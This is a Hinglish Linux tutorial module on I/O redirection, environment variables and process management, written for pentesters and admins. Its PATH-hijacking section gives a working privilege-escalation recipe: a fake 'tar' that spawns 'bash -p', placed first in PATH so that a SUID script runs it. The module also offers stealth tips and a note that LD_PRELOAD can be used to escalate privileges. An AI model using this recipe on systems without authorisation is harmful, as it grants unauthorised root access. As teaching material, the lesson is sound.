# **Module 3: Essential Toolbox (Part 3)**

## **Topic 4: I/O Redirection & Piping**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**I/O Redirection & Piping:** Command output ko control karna - files mein save karna ya dusre commands ko pass karna.

### **2. Ye Kya Hai? (What is it?)**
I/O Redirection wo technique hai jisse command ka output (stdout) ya errors (stderr) ko files mein redirect karte hain. Piping se ek command ka output dusre command ko input ke roop mein dete hain.

**Analogy:** Sochiye ek factory hai. Normal output (stdout) wo products hain jo conveyor belt par aate hain. Errors (stderr) wo defective products hain jo alag belt par jaate hain. Redirection se aap decide karte hain ki products kahan jayein (file mein save ho ya dustbin mein). Piping se ek factory ka output dusri factory ka input ban jata hai.

### **3. Kyun Zaroori Hai? (Why is it important?)**
**Pentester ke liye:**
- Command output ko files mein save karna (evidence collection)
- Errors hide karna (stealth operations)
- Multiple commands chain karna (efficient enumeration)
- Data processing pipelines banana

**VPS Admin ke liye:**
- Logs save karna
- Command output analyze karna
- Automated scripts banana
- Error handling
- Data processing

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Command output save karni ho
- Errors hide karni ho
- Multiple commands combine karni ho
- Data filter/process karna ho
- Automated tasks ke liye

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Command output screen par hi rahega, save nahi kar payenge. Complex data processing manual karna padega. Errors screen ko clutter karenge. Efficient automation impossible hoga.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Output Redirection:**
```bash
command > file          # Output ko file mein (overwrite)
command >> file         # Output ko file mein (append)
command 2> file         # Errors ko file mein
command &> file         # Output + Errors dono
command > file 2>&1     # Output + Errors (alternate)
```

**Input Redirection:**
```bash
command < file          # File se input lena
```

**Piping:**
```bash
command1 | command2     # command1 ka output â†’ command2 ka input
```

**Special Redirections:**
```bash
command > /dev/null     # Output discard (black hole)
command 2>/dev/null     # Errors discard
command &>/dev/null     # Sab kuch discard
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Output save karna**
```bash
ls -la /home > listing.txt
```

| Command Part | Matlab |
|--------------|--------|
| `ls -la /home` | Directory listing |
| `>` | Redirect output |
| `listing.txt` | Output file (overwrite) |

**Expected Output:** File mein listing save ho jayegi.

**Scenario 2: Output append karna**
```bash
date >> log.txt
```

| Command Part | Matlab |
|--------------|--------|
| `date` | Current date/time |
| `>>` | Append to file |
| `log.txt` | Log file |

**Scenario 3: Errors hide karna**
```bash
find / -name "*.conf" 2>/dev/null
```

| Command Part | Matlab |
|--------------|--------|
| `find /` | Search command |
| `2>` | Redirect stderr (errors) |
| `/dev/null` | Black hole (discard) |

**Scenario 4: Piping - filtering**
```bash
cat /etc/passwd | grep "bash" | cut -d: -f1
```

| Command Part | Matlab |
|--------------|--------|
| `cat /etc/passwd` | File content |
| `|` | Pipe to next command |
| `grep "bash"` | Filter bash users |
| `| cut -d: -f1` | Extract usernames |

**Expected Output:** Bash users ki list.

**Scenario 5: Complex pipeline**
```bash
ps aux | grep apache | awk '{print $2}' | xargs kill
```

| Command Part | Matlab |
|--------------|--------|
| `ps aux` | All processes |
| `grep apache` | Apache processes filter |
| `awk '{print $2}'` | PIDs extract |
| `xargs kill` | Kill those PIDs |

**Scenario 6: Output aur errors alag save**
```bash
command > output.txt 2> errors.txt
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- `>` aur `>>` confuse karna (overwrite vs append)
- `2>` ke jagah `>` use karna (errors redirect nahi honge)
- Piping mein space na dena: `command|command` (kaam karega lekin readable nahi)
- `/dev/null` ko file samajhna (ye virtual device hai)
- Redirection order galat: `2>&1 > file` instead of `> file 2>&1`

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Important files overwrite se pehle backup lein
- **Stealth Tip:** Pentesting mein hamesha `2>/dev/null` use karein errors hide karne ke liye
- Long pipelines ko readable banane ke liye backslash use karein: `command1 | \n command2`
- `tee` command se output screen par bhi dikhe aur file mein bhi save ho: `command | tee file.txt`
- `&>>` se append with both stdout and stderr

### **10. Asli Duniya ka Scenario (Real-World Scenario)**
Ek pentester enumeration kar raha tha. Usne `find / -perm -4000 2>/dev/null > suid_files.txt` chalaya. Errors hide ho gayi aur SUID files list save ho gayi. Phir usne `cat suid_files.txt | grep -v "/usr/bin" | grep -v "/bin"` se unusual locations filter kiye.

Ek admin daily logs collect kar raha tha: `journalctl -p err --since today | tee -a /var/log/daily_errors.log`. Output screen par bhi dikha aur file mein bhi append ho gaya.

### **11. Checklist / Chota Recap (TL;DR)**
- `>` overwrite, `>>` append
- `2>` errors redirect
- `|` piping (output â†’ input)
- `/dev/null` discard karne ke liye
- `tee` screen + file dono

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `>` aur `>>` mein kya fark hai?**
A: `>` file ko overwrite karta hai. `>>` file ke end mein append karta hai.

**Q2: `/dev/null` kya hai?**
A: Ye ek special device file hai jo sab kuch discard kar deta hai (black hole).

**Q3: `2>&1` ka kya matlab hai?**
A: Stderr (2) ko stdout (1) mein redirect karo. Dono ek saath same jagah jayenge.

**Q4: Piping aur redirection mein kya fark hai?**
A: Piping command-to-command hai (`|`). Redirection command-to-file hai (`>`, `>>`).

**Q5: `tee` command kya karta hai?**
A: Output ko screen par bhi dikhata hai aur file mein bhi save karta hai.

### **13. Practice ke liye Task**
1. `ls -la > test.txt` - Output save
2. `date >> test.txt` - Append
3. `cat test.txt` - Verify
4. `cat /etc/passwd | grep bash` - Piping
5. `find /etc -name "*.conf" 2>/dev/null | wc -l` - Count config files

**Expected Output:** File with listing + date, bash users, config files count.

### **14. Extra / Advanced Jaankari (Optional)**
- **Here Documents:** `cat << EOF` multi-line input ke liye
- **Process Substitution:** `diff <(command1) <(command2)`
- **Named Pipes:** `mkfifo pipe` inter-process communication
- **File Descriptors:** 0=stdin, 1=stdout, 2=stderr

### **15. Aakhri Choti Summary (5 lines)**
- `>` output redirect (overwrite), `>>` append
- `2>` errors redirect, `&>` both redirect
- `|` piping - command chaining
- `/dev/null` output discard karne ke liye
- `tee` screen aur file dono mein output

> **Ye Zaroor Yaad Rakhein**
> 1. `>` overwrites, `>>` appends
> 2. `2>/dev/null` errors hide karta hai
> 3. `|` commands chain karta hai
> 4. `tee` screen + file dono
> 5. Redirection order matters: `> file 2>&1`

---

## **Topic 5: Environment Variables & PATH Hijacking**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Environment Variables & PATH Hijacking:** System settings jo programs ko affect karte hain - aur unhe exploit karna.

### **2. Ye Kya Hai? (What is it?)**
Environment variables wo settings hain jo shell aur programs ke behavior ko control karti hain. `$PATH` sabse important variable hai jo decide karta hai ki commands kahan se execute honge. PATH hijacking ek privilege escalation technique hai.

**Analogy:** Environment variables ek GPS system ki tarah hain. `$PATH` wo route map hai jo batata hai ki jab aap "restaurant" bolte hain to kaun sa restaurant (command) jana hai. PATH hijacking matlab aap fake restaurant ka address pehle daal dete hain, to GPS wahan le jayega.

### **3. Kyun Zaroori Hai? (Why is it important?)**
**Pentester ke liye:**
- PATH hijacking se privilege escalation
- Environment variables se sensitive info leak
- Custom exploits ke liye PATH modify karna
- Persistence mechanisms

**VPS Admin ke liye:**
- Custom software paths set karna
- Shell behavior customize karna
- Scripts ke liye variables set karna
- Troubleshooting (PATH issues)

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Custom software install kiya ho
- Scripts mein variables use karne ho
- Pentesting mein privilege escalation
- Shell behavior customize karni ho
- Troubleshooting PATH issues

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Commands "not found" errors denge. Custom software run nahi hoga. Pentesting mein PATH hijacking attacks miss ho jayenge. Scripts properly configure nahi kar payenge.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Common Environment Variables:**
```bash
$PATH       # Command search paths
$HOME       # User home directory
$USER       # Current username
$SHELL      # Current shell
$PWD        # Current directory
$OLDPWD     # Previous directory
$LANG       # Language settings
$EDITOR     # Default text editor
```

**Variable Operations:**
```bash
# View variable
echo $PATH

# Set variable (temporary)
export VAR="value"

# Set PATH
export PATH=/new/path:$PATH

# Unset variable
unset VAR

# List all variables
env
printenv

# Persistent (add to ~/.bashrc)
echo 'export PATH=/new/path:$PATH' >> ~/.bashrc
```

**PATH Hijacking Concept:**
```bash
# Normal PATH
/usr/local/bin:/usr/bin:/bin

# Hijacked PATH (malicious dir first)
/tmp/evil:/usr/local/bin:/usr/bin:/bin
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: PATH dekhna**
```bash
echo $PATH
```

**Expected Output:** `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

**Scenario 2: Custom path add karna**
```bash
export PATH=/opt/myapp/bin:$PATH
```

| Command Part | Matlab |
|--------------|--------|
| `export` | Variable ko environment mein set |
| `PATH=` | PATH variable |
| `/opt/myapp/bin:` | Naya path (pehle) |
| `$PATH` | Purana PATH append |

**Scenario 3: PATH Hijacking Attack**

Vulnerable script (`/usr/local/bin/backup.sh`):
```bash
#!/bin/bash
tar czf backup.tar.gz /data
```

Attack:
```bash
# Malicious tar binary banana
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar

# PATH hijack
export PATH=/tmp:$PATH

# Vulnerable script run (agar SUID hai)
/usr/local/bin/backup.sh
```

| Step | Matlab |
|------|--------|
| Create fake `tar` | Malicious binary |
| `chmod +x` | Executable banana |
| `export PATH=/tmp:$PATH` | /tmp ko pehle dalna |
| Run script | Fake tar execute hoga |

**Scenario 4: Variable set karna**
```bash
export EDITOR=vim
export HISTSIZE=10000
```

**Scenario 5: Persistent variable**
```bash
echo 'export PATH=$PATH:/opt/tools' >> ~/.bashrc
source ~/.bashrc
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- `export` ke bina variable set karna (child processes ko nahi milega)
- PATH mein `:$PATH` bhoolna (purana PATH overwrite ho jayega)
- Quotes na use karna spaces wali values mein
- `~/.bashrc` edit ke baad `source` na karna
- PATH hijacking mein absolute paths use karna scripts mein (secure)

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Scripts mein hamesha absolute paths use karein: `/bin/tar` instead of `tar`
- **Stealth Tip:** Pentesting mein writable directories check karein jo PATH mein hain
- Variables ko quotes mein use karein: `"$VAR"` instead of `$VAR`
- `which command` se dekh sakte hain command kahan se execute ho raha hai
- Sensitive scripts mein `PATH` ko explicitly set karein

### **10. Asli Duniya ka Scenario (Real-World Scenario)**
Ek pentester ne dekha ki ek SUID script `ps` command use kar rahi hai bina absolute path ke. Usne `/tmp/ps` naam ki malicious script banayi jo root shell deti hai. Phir `export PATH=/tmp:$PATH` kiya aur SUID script run ki. Fake `ps` execute hua aur root shell mil gaya.

Ek developer ne custom tool `/opt/mytool` mein install kiya. Usne `export PATH=$PATH:/opt/mytool` apne `~/.bashrc` mein add kiya. Ab wo tool kahi se bhi run kar sakta tha.

### **11. Checklist / Chota Recap (TL;DR)**
- `echo $PATH` - PATH dekhna
- `export VAR=value` - Variable set
- `export PATH=/new:$PATH` - PATH modify
- `~/.bashrc` - Persistent variables
- `which command` - Command location

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `export` kab use karna chahiye?**
A: Jab variable child processes ko bhi chahiye. Bina export ke sirf current shell mein rahega.

**Q2: PATH hijacking kaise kaam karta hai?**
A: Agar script relative command use kare (`tar`) aur PATH mein malicious directory pehle ho, to fake command execute hoga.

**Q3: `~/.bashrc` aur `~/.bash_profile` mein kya fark hai?**
A: `.bashrc` non-login shells ke liye, `.bash_profile` login shells ke liye. Usually `.bash_profile` `.bashrc` ko source karta hai.

**Q4: Variable unset kaise karein?**
A: `unset VARNAME`

**Q5: PATH hijacking se kaise bachein?**
A: Scripts mein absolute paths use karein (`/bin/tar` instead of `tar`).

### **13. Practice ke liye Task**
1. `echo $PATH` - Current PATH
2. `export MYVAR="Hello"` - Variable set
3. `echo $MYVAR` - Verify
4. `which ls` - ls command location
5. `env | grep PATH` - PATH in environment

**Expected Output:** PATH, "Hello", ls location, PATH variable.

### **14. Extra / Advanced Jaankari (Optional)**
- **`$PS1`:** Shell prompt customize karna
- **`$LD_LIBRARY_PATH`:** Shared library paths (library hijacking)
- **`$LD_PRELOAD`:** Library preloading (powerful privilege escalation)
- **`.bash_logout`:** Logout time commands

### **15. Aakhri Choti Summary (5 lines)**
- Environment variables system settings control karte hain
- `$PATH` command search paths define karta hai
- PATH hijacking privilege escalation technique hai
- Scripts mein absolute paths use karein security ke liye
- `~/.bashrc` mein persistent variables set karein

> **Ye Zaroor Yaad Rakhein**
> 1. `export` variable ko environment mein set karta hai
> 2. PATH hijacking = malicious directory pehle dalna
> 3. Scripts mein absolute paths use karein
> 4. `which command` se location check karein
> 5. `~/.bashrc` persistent settings ke liye

---

## **Topic 6: Process Management**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Process Management:** Running programs ko control karna - start, stop, monitor, aur manage.

### **2. Ye Kya Hai? (What is it?)**
Process ek running program hai. Process management se hum processes ko view karte hain, control karte hain (kill, pause, resume), aur monitor karte hain (CPU, memory usage).

**Analogy:** Processes ek factory ke workers ki tarah hain. Har worker (process) ek specific kaam kar raha hai. Process management wo supervisor hai jo dekh raha hai kaun kya kar raha hai, kaun zyada resources use kar raha hai, aur zaroorat pade to kisi ko rok sakta hai (kill).

### **3. Kyun Zaroori Hai? (Why is it important?)**
**Pentester ke liye:**
- Suspicious processes identify karna
- Malicious processes kill karna
- Background processes run karna (persistence)
- Resource usage monitor karna
- Process enumeration

**VPS Admin ke liye:**
- Hung processes kill karna
- Resource hogs identify karna
- Services manage karna
- Performance monitoring
- Troubleshooting

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- System slow ho raha ho
- Process hang ho gayi ho
- Background tasks run karni ho
- Resource usage check karni ho
- Services troubleshoot karni ho

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Hung processes kill nahi kar payenge. System slow hone par reason nahi pata chalega. Background tasks run nahi kar payenge. Resource issues troubleshoot nahi kar payenge.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Process Viewing:**
```bash
ps                  # Current shell processes
ps aux              # All processes (detailed)
ps -ef              # All processes (alternate)
top                 # Real-time monitoring
htop                # Interactive top (better)
pgrep process_name  # Find PID by name
```

**Process Control:**
```bash
kill PID            # Terminate process
kill -9 PID         # Force kill (SIGKILL)
killall name        # Kill by name
pkill name          # Kill by pattern
```

**Background/Foreground:**
```bash
command &           # Run in background
jobs                # List background jobs
fg %1               # Bring job 1 to foreground
bg %1               # Resume job 1 in background
Ctrl+Z              # Suspend current process
```

**Resource Monitoring:**
```bash
free -h             # Memory usage
uptime              # System uptime & load
vmstat              # Virtual memory stats
iostat              # I/O statistics
```

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: All processes dekhna**
```bash
ps aux
```

| Command Part | Matlab |
|--------------|--------|
| `ps` | Process status |
| `a` | All users |
| `u` | User-oriented format |
| `x` | Include processes without TTY |

**Expected Output:**
```
USER  PID %CPU %MEM    VSZ   RSS TTY STAT START TIME COMMAND
root    1  0.0  0.1 169416 11234 ?   Ss   10:00 0:01 /sbin/init
```

**Scenario 2: Specific process dhoondhna**
```bash
ps aux | grep apache
```

**Scenario 3: Process kill karna**
```bash
kill 1234
```

| Command Part | Matlab |
|--------------|--------|
| `kill` | Send signal to process |
| `1234` | Process ID (PID) |

**Scenario 4: Force kill**
```bash
kill -9 1234
```

| Signal | Matlab |
|--------|--------|
| Default (15) | SIGTERM - graceful shutdown |
| `-9` | SIGKILL - force kill (cannot be ignored) |

**Scenario 5: Background process**
```bash
sleep 100 &
```

| Command Part | Matlab |
|--------------|--------|
| `sleep 100` | 100 seconds wait |
| `&` | Background mein run |

**Expected Output:** `[1] 5678` (job number aur PID)

**Scenario 6: Jobs manage karna**
```bash
jobs
fg %1
```

**Scenario 7: Real-time monitoring**
```bash
top
```

**Top shortcuts:**
- `q` - Quit
- `k` - Kill process
- `M` - Sort by memory
- `P` - Sort by CPU
- `1` - Show all CPUs

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- `kill -9` ko pehla option samajhna (graceful kill try karein pehle)
- PID aur process name confuse karna
- Background process ke output ko handle na karna
- `top` se bahar nikalna na aana (`q` press karein)
- System processes ko accidentally kill karna

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Important processes kill karne se pehle confirm karein
- Pehle `kill` (SIGTERM) try karein, phir `kill -9` (SIGKILL)
- **Stealth Tip:** Pentesting mein `ps aux | grep -v grep` use karein apni grep process hide karne ke liye
- `htop` install karein - `top` se better hai
- Long-running tasks ke liye `nohup command &` use karein (logout ke baad bhi chalega)

### **10. Asli Duniya ka Scenario (Real-World Scenario)**
Ek server par Apache hang ho gaya tha. Admin ne `ps aux | grep apache` se PIDs nikale, phir `kill PID` se gracefully stop karne ki koshish ki. Kaam nahi kiya to `kill -9 PID` se force kill kiya. Phir `systemctl start apache2` se service restart ki.

Ek pentester ne `ps aux` chalaya aur dekha ki ek suspicious process `/tmp/.hidden` se chal rahi hai. Usne `kill -9 PID` se wo malware process kill ki aur phir file analyze ki.

### **11. Checklist / Chota Recap (TL;DR)**
- `ps aux` - All processes
- `top` / `htop` - Real-time monitoring
- `kill PID` - Terminate process
- `kill -9 PID` - Force kill
- `command &` - Background run
- `jobs` - Background jobs list

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `kill` aur `kill -9` mein kya fark hai?**
A: `kill` (SIGTERM) graceful shutdown - process cleanup kar sakta hai. `kill -9` (SIGKILL) immediate force kill - cleanup nahi hota.

**Q2: Background process ka output kahan jata hai?**
A: Terminal par hi aata hai. Redirect karein: `command > output.log 2>&1 &`

**Q3: `top` aur `htop` mein kya fark hai?**
A: `htop` interactive hai, colorful hai, mouse support hai, aur user-friendly hai. `top` basic hai.

**Q4: Process hang ho gayi hai, kaise kill karein?**
A: PID find karein (`ps aux | grep name`), phir `kill PID`. Agar kaam na kare to `kill -9 PID`.

**Q5: `nohup` kya karta hai?**
A: Process ko logout ke baad bhi chalata rehta hai. Output `nohup.out` file mein save hota hai.

### **13. Practice ke liye Task**
1. `ps aux | head -10` - Top 10 processes
2. `sleep 60 &` - Background process
3. `jobs` - Background jobs
4. `fg %1` - Foreground lao
5. `Ctrl+Z` then `bg %1` - Suspend aur resume

**Expected Output:** Process list, background job, job brought to foreground.

### **14. Extra / Advanced Jaankari (Optional)**
- **`nice` / `renice`:** Process priority set karna
- **`pstree`:** Process tree view
- **`lsof`:** Open files by process
- **`strace`:** System calls trace karna
- **Signals:** SIGHUP (1), SIGINT (2), SIGTERM (15), SIGKILL (9)

### **15. Aakhri Choti Summary (5 lines)**
- Processes running programs hain
- `ps aux` all processes dikhata hai
- `kill PID` process terminate karta hai
- `&` background mein run karta hai
- `top`/`htop` real-time monitoring ke liye

> **Ye Zaroor Yaad Rakhein**
> 1. `ps aux` all processes ke liye
> 2. `kill` graceful, `kill -9` force
> 3. `command &` background run
> 4. `jobs` background jobs list
> 5. `htop` better than `top`

---

## **Module 3 Complete Takeaway**

Is module mein humne Linux command-line ki complete toolkit seekhi. Package managers se software manage karna, text editors se configs edit karna, file operations (search, archive, manipulate), I/O redirection aur piping se efficient workflows banana, environment variables aur PATH hijacking se system customize karna aur exploit karna, aur process management se running programs control karna. Ye sab skills har Linux professional ke liye fundamental hain. Practice karte rahein - ye commands aapki muscle memory ban jayengi aur aap command-line par expert ban jayenge.

